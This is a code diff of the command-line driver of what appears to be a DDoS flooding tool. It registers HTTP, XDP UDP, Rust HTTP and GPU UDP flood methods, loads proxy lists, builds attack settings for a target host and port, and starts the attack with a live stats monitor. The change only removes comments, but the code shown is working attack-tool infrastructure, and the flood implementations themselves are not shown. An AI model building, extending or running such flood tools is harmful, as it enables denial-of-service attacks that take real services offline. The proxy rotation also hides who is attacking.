@@ -15,7 +15,7 @@ METHODS = {
     "http-async": HTTPAsyncFlood,
     "xdp": XdpUdpFlood,
     "http-rust": RustHttpFlood,
-    "gpu": GpuUdpFlood,          # <-- add this
+    "gpu": GpuUdpFlood,          
 }
 
 def main():
@@ -38,13 +38,13 @@ def main():
 
     args = parser.parse_args()
 
-    # Setup proxy manager if file provided
+   
     pm = None
     if args.proxy_file:
         pm = ProxyManager(args.proxy_file)
         print(f"[*] Loaded {len(pm.proxies)} proxies")
 
-    # Base arguments for all attacks
+  
     attack_kwargs = {
         "target": args.target,
         "port": args.port,
@@ -75,18 +75,15 @@ def main():
             "send_threads": args.send_threads,
     })
 
-    # Instantiate the selected attack
     attack_class = METHODS[args.method]
     attack = attack_class(**attack_kwargs)
 
-    # Start stats monitor
     monitor = StatsMonitor(attack, interval=1.0, json_output=args.json)
     monitor.start()
 
     print(f"[*] Starting {args.method.upper()} attack on {args.target}:{args.port}")
     stats = attack.start()
 
-    # Print final summary
     if args.json:
         print(json.dumps(stats))
     else:
